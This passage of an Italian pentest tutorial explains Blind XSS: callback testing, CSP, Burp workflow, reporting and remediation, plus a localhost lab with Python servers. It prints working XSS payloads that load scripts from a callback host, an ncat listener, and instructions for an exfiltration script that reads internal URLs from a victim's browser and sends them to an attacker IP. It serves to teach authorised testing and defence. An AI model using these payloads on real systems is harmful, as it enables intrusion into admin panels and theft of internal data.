---
title: 'Blind XSS: Cos''è, Test, Payload, Bypass e Tool per Pentest'
slug: blind-xss
description: 'Blind XSS: payload, callback out-of-band, detection con Burp Suite, CSP, tool HackITA e laboratorio locale con test pratici, PoC e remediation per pentest.'
image: /blind-xss-payload-callback-pentesting.webp
draft: false
date: 2026-03-28T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - Blind XSS
  - Blind XSS Testing
  - XSS Payload
  - XSS Pentesting
  - BLIND XSS TOOL
---

# Blind XSS: Come Testarla, Payload, Callback e Strumenti nei Pentest

La **`Blind XSS`** è una vulnerabilità XSS in cui il payload viene salvato dall'applicazione ed eseguito **più tardi**, in una pagina che l'attaccante non vede mai: un pannello admin, un ticket, un log. Non c'è nessun `alert()` e nessuna risposta visibile. L'unica prova è un **callback** che arriva al tuo server quando qualcun altro apre quella pagina.

Il nome è l'abbreviazione di `Blind Cross-Site Scripting`. Il significato è: XSS cieca, cioè un Cross-Site Scripting di cui non vedi l'esecuzione. In questa guida vediamo come funziona, dove cercarla, come fare il test blind XSS passo per passo con un laboratorio locale, quali payload usare, come la ferma una CSP e come si corregge.

→ Guida principale: [XSS completo](https://hackita.it/articoli/xss/)

→ Vuoi provarla subito? Vai al [laboratorio locale](#laboratorio-locale-blind-xss-prova-tutto-in-locale) in fondo alla guida.

## Cos'è una Blind XSS: la risposta breve

Una Blind XSS è una [Stored XSS](https://hackita.it/articoli/xss-stored/) il cui punto di esecuzione è un contesto diverso da quello dell'iniezione, di solito più privilegiato. Inietti nel form "Contattaci" come utente anonimo, il payload gira nel browser dell'operatore che apre il messaggio. Il ritardo tra iniezione ed esecuzione può essere di minuti, ore o giorni.

## Blind XSS vs Stored XSS vs Reflected XSS

|                               | Reflected XSS                          | Stored XSS                              | Blind XSS                                         |
| ----------------------------- | -------------------------------------- | --------------------------------------- | ------------------------------------------------- |
| Dove viene salvato il payload | Da nessuna parte, torna nella risposta | Nel database, visibile nella stessa app | Nel database, visibile in un'altra parte dell'app |
| Chi lo esegue                 | La vittima che apre il link            | Chiunque apra la pagina                 | Un utente interno, spesso admin                   |
| Lo vedi eseguire              | Sì                                     | Spesso sì                               | No                                                |
| Come lo confermi              | Nella risposta                         | Nella pagina                            | Con un callback out-of-band                       |
| Quando si attiva              | Subito                                 | Alla visita                             | Più tardi, anche giorni dopo                      |

Approfondimenti: [Reflected XSS](https://hackita.it/articoli/reflected-xss/), [Stored XSS](https://hackita.it/articoli/xss-stored/), [DOM XSS](https://hackita.it/articoli/dom-xss/).

## Come funziona un attacco Blind XSS

![Blind XSS flow: payload injected, stored, executed in the admin browser and sent to the callback server](data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgOTAwIDM4MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBmb250LWZhbWlseT0iQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CiAgPGRlZnM+CiAgICA8bWFya2VyIGlkPSJhcnJvdyIgdmlld0JveD0iMCAwIDEwIDEwIiByZWZYPSI5IiByZWZZPSI1IiBtYXJrZXJXaWR0aD0iOCIgbWFya2VySGVpZ2h0PSI4IiBvcmllbnQ9ImF1dG8tc3RhcnQtcmV2ZXJzZSI+CiAgICAgIDxwYXRoIGQ9Ik0wLDAgTDEwLDUgTDAsMTAgeiIgZmlsbD0iI2ZmZmZmZiIvPgogICAgPC9tYXJrZXI+CiAgICA8bWFya2VyIGlkPSJhcnJvd1JlZCIgdmlld0JveD0iMCAwIDEwIDEwIiByZWZYPSI5IiByZWZZPSI1IiBtYXJrZXJXaWR0aD0iOCIgbWFya2VySGVpZ2h0PSI4IiBvcmllbnQ9ImF1dG8tc3RhcnQtcmV2ZXJzZSI+CiAgICAgIDxwYXRoIGQ9Ik0wLDAgTDEwLDUgTDAsMTAgeiIgZmlsbD0iI2ZmMDEwMyIvPgogICAgPC9tYXJrZXI+CiAgPC9kZWZzPgogIDxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSI5MDAiIGhlaWdodD0iMzgwIiBmaWxsPSIjNmIwMDAxIi8+CiAgPHRleHQgeD0iNDUwIiB5PSIzOCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIyMiIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmZmZmZiI+QmxpbmQgWFNTIGZsb3c8L3RleHQ+CiAgPHJlY3QgeD0iNDAiIHk9IjcwIiB3aWR0aD0iMjIwIiBoZWlnaHQ9IjkwIiByeD0iOCIgZmlsbD0iIzAwMDAwMCIgc3Ryb2tlPSIjZmYwMTAzIiBzdHJva2Utd2lkdGg9IjIiLz4KICA8dGV4dCB4PSIxNTAiIHk9IjEwOCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxNiIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmZmZmZiI+QXR0YWNrZXI8L3RleHQ+CiAgPHRleHQgeD0iMTUwIiB5PSIxMzIiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTMiIGZvbnQtd2VpZ2h0PSI0MDAiIGZpbGw9IiNmZmZmZmYiPnNlbmRzIHBheWxvYWQgaW4gYSBmb3JtPC90ZXh0PgogIDxyZWN0IHg9IjM0MCIgeT0iNzAiIHdpZHRoPSIyMjAiIGhlaWdodD0iOTAiIHJ4PSI4IiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMiIvPgogIDx0ZXh0IHg9IjQ1MCIgeT0iMTA4IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjE2IiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmZmZmZmIj5UYXJnZXQgYXBwPC90ZXh0PgogIDx0ZXh0IHg9IjQ1MCIgeT0iMTMyIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjEzIiBmb250LXdlaWdodD0iNDAwIiBmaWxsPSIjZmZmZmZmIj5zdG9yZXMgaXQsIHNob3dzIG5vdGhpbmc8L3RleHQ+CiAgPHJlY3QgeD0iNjQwIiB5PSI3MCIgd2lkdGg9IjIyMCIgaGVpZ2h0PSI5MCIgcng9IjgiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIi8+CiAgPHRleHQgeD0iNzUwIiB5PSIxMDgiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTYiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZmZmZmYiPkFkbWluIGJyb3dzZXI8L3RleHQ+CiAgPHRleHQgeD0iNzUwIiB5PSIxMzIiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTMiIGZvbnQtd2VpZ2h0PSI0MDAiIGZpbGw9IiNmZmZmZmYiPm9wZW5zIHRoZSBpbmJveCBsYXRlcjwvdGV4dD4KICA8bGluZSB4MT0iMjYwIiB5MT0iMTE1IiB4Mj0iMzM4IiB5Mj0iMTE1IiBzdHJva2U9IiNmZmZmZmYiIHN0cm9rZS13aWR0aD0iMiIgbWFya2VyLWVuZD0idXJsKCNhcnJvdykiLz4KICA8dGV4dCB4PSIyOTkiIHk9IjEwNCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiI+MTwvdGV4dD4KICA8bGluZSB4MT0iNTYwIiB5MT0iMTE1IiB4Mj0iNjM4IiB5Mj0iMTE1IiBzdHJva2U9IiNmZmZmZmYiIHN0cm9rZS13aWR0aD0iMiIgbWFya2VyLWVuZD0idXJsKCNhcnJvdykiLz4KICA8dGV4dCB4PSI1OTkiIHk9IjEwNCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiI+MjwvdGV4dD4KICA8cmVjdCB4PSI2NDAiIHk9IjI1MCIgd2lkdGg9IjIyMCIgaGVpZ2h0PSI5MCIgcng9IjgiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIzIi8+CiAgPHRleHQgeD0iNzUwIiB5PSIyODgiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTYiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZmZmZmYiPkNhbGxiYWNrIHNlcnZlcjwvdGV4dD4KICA8dGV4dCB4PSI3NTAiIHk9IjMxMiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjQwMCIgZmlsbD0iI2ZmZmZmZiI+Z2V0cyBpZCBhbmQgcGFnZSBVUkw8L3RleHQ+CiAgPGxpbmUgeDE9Ijc1MCIgeTE9IjE2MCIgeDI9Ijc1MCIgeTI9IjI0OCIgc3Ryb2tlPSIjZmYwMTAzIiBzdHJva2Utd2lkdGg9IjIiIG1hcmtlci1lbmQ9InVybCgjYXJyb3dSZWQpIi8+CiAgPHRleHQgeD0iNzMyIiB5PSIyMDgiIHRleHQtYW5jaG9yPSJlbmQiIGZvbnQtc2l6ZT0iMTMiIGZvbnQtd2VpZ2h0PSI2MDAiIGZpbGw9IiNmZmZmZmYiPjMgc2NyaXB0IHJ1bnMsIGNhbGxzIGJhY2s8L3RleHQ+CiAgPGxpbmUgeDE9IjY0MCIgeTE9IjI5NSIgeDI9IjE1MCIgeTI9IjE2MiIgc3Ryb2tlPSIjZmZmZmZmIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1kYXNoYXJyYXk9IjYsNCIgbWFya2VyLWVuZD0idXJsKCNhcnJvdykiLz4KICA8dGV4dCB4PSIzMDAiIHk9IjI2MCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiI+NCBhdHRhY2tlciByZWFkcyB0aGUgbG9nPC90ZXh0Pgo8L3N2Zz4K)

Il flusso ha quattro passaggi: invii il payload, l'app lo salva, l'admin apre la pagina e il browser esegue lo script, lo script chiama il tuo server. Per questo ti serve sempre un **server di callback** raggiungibile dal browser della vittima.

## Blind XSS Attack Surface: input e punti di iniezione

Il campo che inietti non è quello dove il payload gira. Devi chiederti: **chi legge questo dato, e dove?**

| Campo iniettato                       | Chi lo vede         | Dove                             |
| ------------------------------------- | ------------------- | -------------------------------- |
| Ticket di supporto                    | Agente helpdesk     | Sistema di ticketing             |
| Form "Contattaci"                     | Admin, team support | Casella messaggi                 |
| Username / display name               | Admin               | Lista utenti                     |
| Commento o review                     | Moderatore          | Pannello di moderazione          |
| Nome del file caricato                | Admin               | File manager                     |
| Campo note                            | Operatore           | CRM                              |
| Header HTTP (`User-Agent`, `Referer`) | Admin, analista     | Log degli accessi, analytics     |
| Messaggio di errore                   | Sviluppatore, SRE   | Log applicativi, SIEM, notifiche |

Regola pratica: inietta in **ogni** campo che qualcuno con più privilegi di te potrebbe leggere.

## Blind XSS Detection: callback e Out-of-Band Testing

Il test usa la tecnica `Out-of-Band`. Il significato è: fuori banda, cioè la conferma non arriva nella risposta HTTP ma su un canale separato, il tuo server. Servono tre cose:

* un server raggiungibile dal browser della vittima
* un payload che chiama quel server quando viene eseguito
* un **ID univoco per ogni campo**, così sai quale iniezione è scattata

Un callback utile deve dire: quale campo ha scattato (`id`), in quale pagina (`location.href`) e quando. Non serve rubare nulla per dimostrare la vulnerabilità.

## Blind XSS Payload: identificazione e callback

Il payload base carica uno script esterno con l'ID del campo:

```html
<script src="http://127.0.0.1:8021/p.js?id=contact_name"></script>
```

Usare un file esterno ha un vantaggio: cambi l'azione dopo l'iniezione senza dover reinserire il payload. Per un contesto dentro un attributo HTML serve prima uscire dal contesto:

```html
"><script src="http://127.0.0.1:8021/p.js?id=contact_name"></script>
```

Se il filtro blocca `<script>`, si prova un evento su un altro tag, per esempio `<img src=x onerror="...">`. Per ogni payload cambia sempre l'`id`, altrimenti non sai quale campo era vulnerabile.

Usa un callback **di conferma**: ID, URL, nomi dei cookie, titolo della pagina. Non raccogliere cookie, `localStorage` o il DOM completo: in un pentest vero sono dati personali e non servono per provare la vulnerabilità.

## Context Detection e HTML Injection

Prima di scegliere il payload devi capire dove atterra il dato. Un test con un marcatore innocuo, per esempio `blindtest"'<b>`, e guardi come viene riflesso o salvato:

| Contesto          | Come lo riconosci                | Cosa serve                                  |
| ----------------- | -------------------------------- | ------------------------------------------- |
| Corpo HTML        | Il `<b>` diventa grassetto       | Un tag diretto, come `<script>` o `<img>`   |
| Attributo         | Il `"` chiude l'attributo        | Chiudere con `">` o aggiungere un evento    |
| Dentro JavaScript | Il valore è in una stringa JS    | Chiudere la stringa con `'` e proseguire    |
| URL               | Il valore è in un `href` o `src` | Uno schema come `javascript:` (se permesso) |
| Testo escapato    | Vedi `&lt;b&gt;`                 | Niente XSS in questo punto                  |

Se vedi `&lt;`, quel campo è sicuro in quel punto: passa al successivo.

## CSP e Blind XSS

Una [Content Security Policy](https://hackita.it/articoli/xss-csp-bypass/) può bloccare una Blind XSS in punti diversi. Le direttive non fanno la stessa cosa:

| Direttiva      | Cosa blocca nel flusso                                        |
| -------------- | ------------------------------------------------------------- |
| `script-src`   | Il caricamento di `p.js` da un altro host e gli script inline |
| `connect-src`  | Le richieste fatte con `fetch` e `XMLHttpRequest`             |
| `img-src`      | Il callback fatto con `new Image()`                           |
| `nonce` e hash | Gli script inline senza nonce valido                          |

Nel nostro lab il callback usa un'immagine, quindi anche con `script-src` aperto servirebbe `img-src` aperto. Nei pentest controlla l'header del pannello admin, non della pagina pubblica: sono pagine diverse e possono avere CSP diverse. Per i bypass vedi [XSS CSP bypass](https://hackita.it/articoli/xss-csp-bypass/).

## Blind XSS Testing Methodology

Tieni una matrice con tutti i punti testati. Senza, dopo tre giorni non sai quale iniezione è scattata:

| Input                        | Contesto   | ID payload     | Iniettato il | Callback    | Note                 |
| ---------------------------- | ---------- | -------------- | ------------ | ----------- | -------------------- |
| `/contact` campo `name`      | Corpo HTML | `contact_name` | 01/11 17:00  | 02/11 09:12 | Scattato su `/admin` |
| Header `User-Agent`          | Log        | `ua_header`    | 01/11 17:05  | Nessuno     | Da ripetere          |
| `/register` campo `username` | Attributo  | `reg_username` | 01/11 17:10  | Nessuno     | Escapato             |

Workflow:

* Fai la mappa di form, header, upload e API che salvano dati.
* Inietta un payload con ID diverso in ognuno e registra ora e contesto.
* Lascia il server di callback acceso per 24-72 ore: gli admin non aprono le pagine ogni secondo.
* Quando arriva un callback, collega l'ID alla riga della matrice.

### Blind XSS con Burp Suite

Con [Burp Suite](https://hackita.it/articoli/burp-suite/) il lavoro è più ordinato:

* **Proxy / HTTP history**: trovi tutte le richieste che salvano dati.
* **Repeater**: reinvii la richiesta cambiando solo il payload e l'ID.
* **Intruder**: inietti lo stesso payload in più parametri, con un ID diverso per ogni posizione.
* **Collaborator**: è il canale out-of-band già pronto di Burp, utile quando non puoi esporre un tuo server.
* **Logger**: registra ora e richiesta di ogni iniezione.

## Blind XSS test online: strumenti per testare un sito

Chi cerca "blind XSS test" o "attack website online tool" trova spesso servizi online che promettono di attaccare un sito con un click. Non esiste una scorciatoia: per confermare una Blind XSS serve sempre un **canale di callback** che controlli tu, e un target che hai il permesso di testare. Gli strumenti reali sono questi:

| Strumento                                                                                         | A cosa serve                                                                   | Nota                                                                                                                      |
| ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------- |
| **[XSS Internal Exfiltration PoC (HackITA)](https://github.com/hack-ita/xss-internal-exfil-poc)** | Dopo il callback: leggere un URL interno dal browser della vittima e riceverlo | Open source, MIT. Spiegato qui sotto                                                                                      |
| Server di callback proprio (lab in fondo)                                                         | Conferma dell'esecuzione, con ID per campo                                     | Controllo totale, nessun dato esce                                                                                        |
| [Burp Suite](https://hackita.it/articoli/burp-suite/) con Collaborator                            | Iniezione, tracciamento e canale out-of-band già pronto                        | Conferma l'esecuzione, non mostra il DOM                                                                                  |
| XSS Hunter                                                                                        | Callback, screenshot della pagina, notifiche                                   | Il servizio hosted originale è cambiato più volte e oggi si usa spesso la versione self-hosted: verifica lo stato attuale |

Se usi un server pubblico per i test veri, proteggilo: HTTPS, autenticazione sulla pagina dei log, rate limiting e cancellazione dei dati dopo il report. Un server di callback aperto riceve dati di terzi.

## XSS Internal Exfiltration PoC: il tool HackITA

Il callback ti dice che il tuo codice gira nel browser dell'admin. La domanda dopo è: **cosa può raggiungere quel browser che tu da fuori non raggiungi?** Un servizio su `127.0.0.1`, un pannello interno, un'API di sviluppo. Il tool open source di HackITA, [xss-internal-exfil-poc](https://github.com/hack-ita/xss-internal-exfil-poc) (script `myexfilxss.js`, licenza MIT), serve a questo: leggere un URL interno dal browser della vittima e riceverne il contenuto.

Non è uno scanner di Blind XSS e non trova niente da solo. Si usa **dopo** la conferma, su laboratori e ambienti autorizzati (HTB, CTF, i tuoi lab).

### Come funziona, passo per passo

* La tua XSS (anche una Blind XSS) carica lo script con un normale `<script src=...>`.
* Lo script fa una richiesta `GET` all'URL interno che hai scelto. Quell'URL è raggiungibile solo dal browser della vittima.
* La risposta viene letta come **byte grezzi** (`arraybuffer`), non come testo. Così HTML, JSON, zip, immagini o eseguibili arrivano senza corrompersi.
* I byte vengono convertiti in base64, a blocchi, per non far esplodere lo stack JavaScript con file grandi.
* Il base64 parte verso il tuo server in **una sola POST** con `Content-Type: text/plain`. Questo tipo di contenuto è una richiesta "semplice", quindi il browser non manda il preflight CORS.
* Tu decodifichi il body con `base64 -d`.

### Cosa devi configurare

Solo due valori, dentro `myexfilxss.js`:

| Cosa                   | Dove                             | Esempio                     |
| ---------------------- | -------------------------------- | --------------------------- |
| URL interno da leggere | variabile `uri` in `stealData()` | `http://127.0.0.1:8080/`    |
| Il tuo listener        | riga `exfil.open("POST", ...)`   | `http://10.10.14.212/exfil` |

### Come si usa

Listener (porta 80) e hosting dello script (porta diversa, la 80 è occupata dal listener):

```bash
# Listener that receives the exfiltrated base64 body
sudo ncat -klvnp 80
```

```bash
# Host myexfilxss.js on a different port
python3 -m http.server 8000
```

Carichi lo script dalla XSS con il payload già visto:

```html
<script src="http://10.10.14.212:8000/myexfilxss.js"></script>
```

Decodifichi quello che arriva (usa l'estensione giusta per il contenuto, per esempio `.html`, `.json`, `.zip`):

```bash
# Decode the body received by the listener
echo 'BASE64_BODY' | base64 -d > response.bin
```

Nel [laboratorio](#laboratorio-locale-blind-xss-prova-tutto-in-locale) in fondo trovi la stessa prova, completa e con valori già pronti (test 5 e 6).

### Limiti: quando non funziona

* **Same-Origin Policy**: per leggere la risposta, il servizio interno deve permettere la lettura cross-origin (header `Access-Control-Allow-Origin`) oppure essere nella stessa origine della pagina vulnerabile. Nel test 6 del lab, senza quell'header il listener riceve un body vuoto. Molti servizi di sviluppo lo permettono, molti no.
* **Solo la risposta del server**: di una pagina PHP ottieni l'output renderizzato, non il sorgente.
* **GET semplice**: il servizio interno deve rispondere a una GET senza header o autenticazione aggiuntivi.
* **CSP e Mixed Content**: la CSP della pagina vulnerabile può bloccare il caricamento dello script o la richiesta XHR (`script-src`, `connect-src`), e una pagina HTTPS blocca richieste verso HTTP.

Per capire perché la richiesta riesce o fallisce leggi [CORS misconfiguration](https://hackita.it/articoli/cors-misconfiguration/) e [Same-Origin Policy](https://hackita.it/articoli/same-origin-policy/).

## Analisi dell'impatto dopo il trigger

Hai il callback. Per il report non serve creare admin o cambiare password: basta mostrare cosa potrebbe fare quel contesto, senza farlo. In un laboratorio:

* Leggi il DOM della pagina admin e identifica le funzioni disponibili.
* Verifica se esistono token [CSRF](https://hackita.it/articoli/csrf/) e come vengono usati, senza copiarli nel report.
* Elenca le API chiamate dalla pagina.
* Dimostra l'impatto con un'azione non distruttiva, per esempio una richiesta GET di sola lettura.
* Scrivi le conseguenze potenziali: cosa potrebbe fare un attaccante vero con quel contesto.

Su un sistema di produzione fermati al callback. Un callback con ID, URL e timestamp prova la vulnerabilità.

## Troubleshooting e falsi positivi

| Sintomo                            | Causa probabile                                 | Cosa fare                                           |
| ---------------------------------- | ----------------------------------------------- | --------------------------------------------------- |
| Nessun callback dopo ore           | Nessuno ha aperto la pagina                     | Aspetta, o chiedi al cliente di aprire la casella   |
| Il payload è salvato ma non scatta | Output escapato                                 | Guarda la pagina: se vedi `&lt;`, il campo è sicuro |
| Lo script è bloccato               | CSP sulla pagina admin                          | Console del browser: cerca `Refused to load`        |
| Callback con URL strano            | Scanner o strumento interno ha aperto la pagina | Verifica `User-Agent` e IP nel log                  |
| Il callback arriva ma senza cookie | Cookie `HttpOnly`                               | Normale, non è un errore                            |
| Callback duplicati                 | Più admin o anteprime della pagina              | Conta una sola vulnerabilità per ID                 |
| Il server di callback non risponde | Porta chiusa o HTTPS/Mixed Content              | Usa HTTPS se la pagina vittima è HTTPS              |

## Blind XSS: severity, evidence e reporting

La gravità non è sempre critica: dipende da **dove** gira il payload e da **cosa** può fare. Una Blind XSS su un pannello admin con funzioni sensibili è alta o critica. Su un log di sola lettura senza dati sensibili può essere media.

Nel report inserisci:

* punto di iniezione esatto (campo, richiesta, payload con ID)
* log del callback con timestamp
* pagina e contesto di esecuzione
* prove dell'impatto potenziale, senza dati personali
* remediation

## Come difendersi dalla Blind XSS

Il difetto è nel pannello interno, non nel form pubblico. Per questo si corregge dove il dato viene **mostrato**:

* **Output encoding contestuale** su ogni dato mostrato: HTML, attributo, JavaScript, URL. Nel lab è `html.escape()` e basta per chiudere i test 1 e 2.
* **Sanitizzazione HTML** con libreria, se devi permettere markup.
* **Content Security Policy** sulle pagine admin: nonce con `'strict-dynamic'`, `object-src 'none'`, e `connect-src` e `img-src` limitati. Il Test 3 mostra l'effetto.
* **Cookie `HttpOnly`, `Secure` e `SameSite`** sulla sessione.
* **Log e pannelli interni trattati come input non fidato**: anche `User-Agent` e `Referer` vanno escapati prima di essere mostrati.
* **Revisione dei pannelli interni**: ticketing, CRM, analytics e log viewer spesso non hanno la stessa cura del sito pubblico.
* **Monitoraggio**: raccogli le violazioni CSP con `report-uri`. Un report `inline` su una pagina admin è un segnale d'allarme.

## Domande frequenti sulla Blind XSS

**Come si testa un sito per Blind XSS?**
Inietti un payload con ID univoco in ogni campo che un utente interno potrebbe leggere, tieni un server di callback acceso e aspetti. Se un admin apre la pagina e il payload gira, il server riceve la richiesta.

**Come funziona il test Blind XSS?**
Il payload contiene l'indirizzo del tuo server. Quando il browser della vittima lo esegue, chiama quell'indirizzo con l'ID del campo. Il log è la prova.

**Come si rileva una Blind XSS?**
Con un callback out-of-band. Senza un canale esterno non puoi vedere l'esecuzione, perché il payload gira in una pagina che non vedi.

**Che differenza c'è tra Stored XSS e Blind XSS?**
La Stored XSS gira in una pagina che puoi aprire anche tu. La Blind XSS gira in una pagina a cui non hai accesso, per esempio il pannello admin.

**Quali strumenti si usano per testare la Blind XSS?**
Un server di callback proprio, Burp Suite con Collaborator e servizi come XSS Hunter (controlla lo stato attuale). Dopo la conferma si usa il tool HackITA [XSS Internal Exfiltration PoC](https://github.com/hack-ita/xss-internal-exfil-poc) per leggere URL interni dal browser della vittima.

**Una Blind XSS si può rilevare in automatico?**
Gli scanner trovano l'iniezione, ma la conferma richiede comunque un callback e dipende dal fatto che qualcuno apra la pagina. Un test manuale con ID univoci resta il metodo più affidabile.

## Laboratorio locale Blind XSS: prova tutto in locale

Tutto gira su `127.0.0.1`. Il target è un'app con form di contatto, una casella admin vulnerabile e tre varianti: log degli accessi, CSP e versione sicura. Più un piccolo servizio "interno" per provare il [tool HackITA](#xss-internal-exfiltration-poc-il-tool-hackita).

```bash
# Create the lab folders
mkdir -p blind-lab/target blind-lab/attacker blind-lab/internal
```

```bash
# Target app: contact form, vulnerable admin inbox, access log, CSP and safe versions
cat > blind-lab/target/blind_target.py <<'EOF'
import html
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

MESSAGES = []   # contact form messages (stored)
ACCESS_LOG = []  # User-Agent values seen by the server

PAGE = "<!doctype html><html><body>{}</body></html>"
FORM = """<h1>Contact us</h1>
<form method="post" action="/contact">
<input name="name" placeholder="name"><br>
<textarea name="message" placeholder="message"></textarea><br>
<input type="submit" value="Send">
</form>"""


def render_messages(escape):
    rows = []
    for name, message in MESSAGES:
        if escape:
            name, message = html.escape(name), html.escape(message)
        rows.append(f"<tr><td>{name}</td><td>{message}</td></tr>")
    return "<h1>Support inbox</h1><table>" + "".join(rows) + "</table>"


def render_logs(escape):
    rows = []
    for agent in ACCESS_LOG:
        rows.append(f"<li>{html.escape(agent) if escape else agent}</li>")
    return "<h1>Access log</h1><ul>" + "".join(rows) + "</ul>"


class Target(BaseHTTPRequestHandler):
    def send_page(self, body, csp=None):
        data = PAGE.format(body).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        if csp:
            self.send_header("Content-Security-Policy", csp)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/":
            ACCESS_LOG.append(self.headers.get("User-Agent", ""))
            self.send_page(FORM)
        elif path == "/login":
            # Admin login: session is HttpOnly, theme is readable by JavaScript
            self.send_response(200)
            self.send_header("Set-Cookie", "session=admin-secret-session; HttpOnly; Path=/")
            self.send_header("Set-Cookie", "theme=dark; Path=/")
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"admin logged in")
        elif path == "/admin":
            self.send_page(render_messages(escape=False))
        elif path == "/admin-logs":
            self.send_page(render_logs(escape=False))
        elif path == "/admin-csp":
            self.send_page(render_messages(escape=False), csp="default-src 'self'")
        elif path == "/admin-safe":
            self.send_page(render_messages(escape=True) + render_logs(escape=True))
        else:
            self.send_error(404)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        fields = parse_qs(self.rfile.read(length).decode())
        MESSAGES.append((fields.get("name", [""])[0], fields.get("message", [""])[0]))
        self.send_response(303)
        self.send_header("Location", "/")
        self.end_headers()

    def log_message(self, *args):
        pass


HTTPServer(("127.0.0.1", 8020), Target).serve_forever()
EOF
```

```bash
# Callback server: serves p.js and logs every callback it receives
cat > blind-lab/attacker/blind_callback.py <<'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
from urllib.parse import parse_qs, urlparse

# JavaScript served to the victim browser: it only confirms the execution
PAYLOAD_JS = """
(function () {
  var id = new URLSearchParams(document.currentScript.src.split('?')[1]).get('id');
  var params = new URLSearchParams({
    id: id,
    url: location.href,
    cookie_names: document.cookie.split(';').map(function (c) { return c.split('=')[0].trim(); }).join(','),
    title: document.title
  });
  new Image().src = 'http://127.0.0.1:8021/callback?' + params.toString();
})();
"""


class Callback(BaseHTTPRequestHandler):
    def do_GET(self):
        url = urlparse(self.path)
        if url.path == "/p.js":
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.end_headers()
            self.wfile.write(PAYLOAD_JS.encode())
        elif url.path == "/callback":
            q = {k: v[0] for k, v in parse_qs(url.query).items()}
            print("CALLBACK id=%s | url=%s | cookies=%s" % (q.get("id"), q.get("url"), q.get("cookie_names")), flush=True)
            self.send_response(204)
            self.end_headers()
        else:
            self.send_error(404)

    def do_POST(self):
        # Receives the base64 body sent by myexfilxss.js and prints it decoded
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        print("EXFIL decoded body: %r" % base64.b64decode(body).decode(errors="replace"), flush=True)
        self.send_response(204)
        self.end_headers()

    def log_message(self, *args):
        pass


HTTPServer(("127.0.0.1", 8021), Callback).serve_forever()
EOF
```

```bash
# Internal service: reachable only from the admin machine, used by the exfiltration test
cat > blind-lab/internal/blind_internal.py <<'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer


class Internal(BaseHTTPRequestHandler):
    def do_GET(self):
        body = b'{"internal_service": "only reachable from the admin machine"}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        # Only the root path sends a CORS header: /nocors does not
        if self.path == "/":
            self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


HTTPServer(("127.0.0.1", 8030), Internal).serve_forever()
EOF
```

Avvia i server (i primi due bastano per i test 1-4):

```bash
# Terminal 1: target app on port 8020
python3 blind-lab/target/blind_target.py
```

```bash
# Terminal 2: callback server on port 8021
python3 blind-lab/attacker/blind_callback.py
```

```bash
# Terminal 3: internal service on port 8030 (only for test 5)
python3 blind-lab/internal/blind_internal.py
```

### Test 1: iniezione nel form e callback dall'admin

Apri `http://127.0.0.1:8020/` nel browser e invia il form con questo valore nel campo `name`:

```html
<script src="http://127.0.0.1:8021/p.js?id=contact_name"></script>
```

Dopo l'invio la pagina ricarica il form e non succede niente: è il "blind". Ora fai il login come admin in un'altra scheda e apri la casella:

```text
http://127.0.0.1:8020/login
http://127.0.0.1:8020/admin
```

Nel Terminale 2 compare:

```text
CALLBACK id=contact_name | url=http://127.0.0.1:8020/admin | cookies=theme
```

Hai la prova: l'`id` dice quale campo ha scattato, `url` dice dove ha girato lo script.

Nota: `cookies=theme` e basta. Il cookie `session` è `HttpOnly`, quindi `document.cookie` non lo vede. Un payload che "ruba i cookie" non prende quel cookie.

### Test 2: header User-Agent nei log

